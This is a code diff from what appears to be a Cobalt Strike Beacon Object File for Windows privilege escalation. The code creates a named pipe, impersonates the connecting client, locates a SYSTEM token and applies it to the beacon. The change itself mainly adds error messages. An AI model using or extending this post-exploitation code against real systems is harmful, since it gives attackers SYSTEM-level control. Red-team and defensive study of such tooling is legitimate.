@@ -93,16 +93,31 @@ void NetSvcGo( _In_ PCHAR Argv, _In_ INT Argc )
 					/* Impersonate the client */
 					if ( Api.ImpersonateNamedPipeClient( Nps ) ) {
 						/* Locate a SYSTEM token */
-						if ( ( Imp = TokenFindSystemToken() ) != NULL ) 
-						{
+						if ( ( Imp = TokenFindSystemToken() ) != NULL ) {
 							/* Impersonate & close handle */
 							BeaconUseToken( Imp ); Api.CloseHandle( Imp );
+						}
+						else
+						{
+							BeaconPrintf( CALLBACK_ERROR, "could not locate a system token." );
 						};
+					} else
+					{
+						BeaconPrintf( CALLBACK_ERROR, "could not impersonate the client user." );
 					};
+				} else
+				{
+					BeaconPrintf( CALLBACK_ERROR, "could not connect the client." );
 				};
 				Api.CloseHandle( Fle );
+			} else
+			{
+				BeaconPrintf( CALLBACK_ERROR, "could not create a named pipe client." );
 			};
 			Api.CloseHandle( Nps );
+		} else 
+		{
+			BeaconPrintf( CALLBACK_ERROR, "could not create a named pipe server." );
 		};
 	};
 	if ( Adv != NULL ) {
